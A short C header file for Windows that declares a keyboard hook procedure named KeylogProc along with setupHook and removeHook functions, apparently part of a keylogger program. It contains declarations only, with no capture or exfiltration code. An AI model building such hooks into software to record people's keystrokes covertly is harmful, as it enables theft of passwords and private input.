#ifndef LOGGER_H
#define LOGGER_H

#include <windows.h>

LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam);

int setupHook();

int removeHook();

#endif